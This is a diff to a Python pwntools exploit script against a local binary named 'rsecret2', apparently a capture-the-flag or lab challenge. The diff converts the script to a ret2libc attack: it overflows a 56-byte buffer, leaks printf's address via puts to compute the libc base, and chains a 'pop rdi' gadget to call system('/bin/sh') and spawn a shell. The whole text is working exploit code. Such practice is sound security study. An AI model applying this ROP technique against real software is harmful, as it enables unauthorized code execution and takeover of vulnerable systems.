@@ -22,7 +22,7 @@ from pprint import pprint
 test_stage = 1
 exploit_stage = 2
 
-target = ["./rsecret3"]
+target = ["./rsecret2"]
 offset = 56
 
 context.arch = "amd64"
@@ -37,28 +37,30 @@ rop = ROP(elf)
 
 rop_libc = ROP(libc)
 
-BIN_SH = next(elf.search(b"/bin/sh\x00"))
+BIN_SH_LIBC = next(libc.search(b"/bin/sh\x00"))
 POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
 POP_RDI_LIBC = rop_libc.find_gadget(["pop rdi", "ret"])[0]
 PRINTF_GOT = elf.got["printf"]
 PUTS_PLT = elf.plt["puts"]
-SYSTEM_PLT = elf.plt["system"]
 SYSTEM_LIBC = libc.symbols["system"]
 
 print("-" * 100)
-print("/bin/sh string offset: " + hex(BIN_SH))
+print("/bin/sh string@libc offset: " + hex(BIN_SH_LIBC))
 print("pop rdi gadget offset: " + hex(POP_RDI))
 print("pop rdi gadget@libc offset: " + hex(POP_RDI_LIBC))
 print("printf@got: " + hex(PRINTF_GOT))
 print("puts@plt: " + hex(PUTS_PLT))
-print("system@plt: " + hex(SYSTEM_PLT))
 print("system@libc offset: " + hex(SYSTEM_LIBC))
 print("-" * 100)
 
-# defaults only
-# libc_base = 0x7ffff7dcb000
-# pop_rdi = libc_base + POP_RDI_LIBC
-# system_libc = libc_base + SYSTEM_LIBC
+# global variables to be calculated by address leak
+global libc_base
+global bin_sh
+global pop_rdi
+global system_libc
+
+p = process(target)
+gdb.attach(p, gdbscript = "continue")
 
 def main():
     test()
@@ -77,15 +79,15 @@ def test():
 
 def exploit(leak=True):
     if leak:
-        rop_leak = p64(POP_RDI) + p64(BIN_SH) + p64(PUTS_PLT)
-        rop_exec = p64(POP_RDI) + p64(BIN_SH) + p64(SYSTEM_PLT)
+        rop_leak = p64(POP_RDI) + p64(bin_sh) + p64(PUTS_PLT)
+        rop_exec = p64(pop_rdi) + p64(bin_sh) + p64(system_libc)
         exploit = [
             b"A" * offset,
             rop_leak,
-            rop_exec
+            rop_exec 
         ]
     else:
-        rop_exec = p64(POP_RDI+1) + p64(POP_RDI) + p64(BIN_SH) + p64(SYSTEM_PLT)
+        rop_exec = p64(pop_rdi+1) + p64(pop_rdi) + p64(bin_sh) + p64(system_libc)
         exploit = [
             b"A" * offset,
             rop_exec
@@ -95,10 +97,10 @@ def exploit(leak=True):
 
 def inject(payload, stage):
     global libc_base
+    global bin_sh
     global pop_rdi
     global system_libc
 
-    p = process(target)
     p.recvuntil("\n")
     p.sendline(payload)
     if stage == test_stage:
@@ -106,6 +108,7 @@ def inject(payload, stage):
         received = p.recvline().rstrip()
         leaked = u64(received.ljust(8, b"\x00"))
         libc_base = leaked - libc.symbols["printf"]
+        bin_sh = libc_base + BIN_SH_LIBC
         pop_rdi = libc_base + POP_RDI_LIBC
         system_libc = libc_base + SYSTEM_LIBC
         print("-" * 100)
